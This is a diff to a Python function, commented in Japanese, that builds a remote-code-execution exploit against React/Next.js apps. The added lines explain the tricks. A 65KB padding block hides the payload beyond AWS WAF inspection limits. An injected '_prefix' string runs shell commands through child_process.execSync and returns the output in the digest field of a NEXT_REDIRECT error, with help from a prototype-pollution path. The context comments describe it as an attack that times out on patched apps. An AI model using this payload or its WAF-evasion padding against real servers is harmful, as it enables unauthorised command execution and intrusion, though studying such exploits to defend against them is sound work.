@@ -30,9 +30,12 @@ async def execute_command(body: dict):
     # ----------------------------------------------------
     # WAF回避のための設定
     # ----------------------------------------------------
-    # WAFの検査制限（例: 64KB）を確実に超えるように、パディングサイズを定義します。
-    # AWS WAFの制限は8KBから64KBの範囲であり、ここでは65KB (65536バイト)とします。
-    # これにより、実際の攻撃ペイロードはWAFの検査窓の外に配置されることが企図されます。
+    # WAFはパフォーマンス維持のためにペイロードの一部しか検査しないことがある。
+    # この挙動を悪用し、WAFの検査範囲外に悪意のあるペイロードを配置することで、
+    # 攻撃を成功させることが可能となる。
+    # WAFの検査制限（例: 64KB）を確実に超えるように、パディングサイズを定義する。
+    # AWS WAFの制限は8KBから64KBの範囲であり、ここでは65KB (65536バイト)とする。
+    # これにより実際の攻撃ペイロードはWAFの検査範囲の外に配置される。
     padding_size = 65 * 1024  # 65KB
     padding_data = "A" * padding_size
 
@@ -49,6 +52,12 @@ async def execute_command(body: dict):
         "_response": {
             # 実行コマンドを注入し、Next.jsのエラーハンドリングを利用して結果を抽出
             # 脆弱性対応されたReactやNext.jsで動作するアプリに対してはタイムアウトになる。
+            # _prefixプロパティにコードを注入する理由は、Reactがここに書かれたコードを
+            # 実行する仕組みになっているためである。
+            # digestという名前のプロパティに結果を保存しているのはdigestプロパティが
+            # Next.jsにおいてエラーハンドリング時にそのままレスポンスに含まれることがあり、
+            # その振る舞いが攻撃者に悪用されやすいためである。
+            # またNEXT_REDIRECTはNext.jsにおいて特別な内部エラーとして処理される。攻撃者はこの振る舞いも利用している。
             "_prefix": f"var res = process.mainModule.require('child_process').execSync('{executable_command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
             # Functionコンストラクタを取得するプロトタイプ汚染パス
             "_formData": {
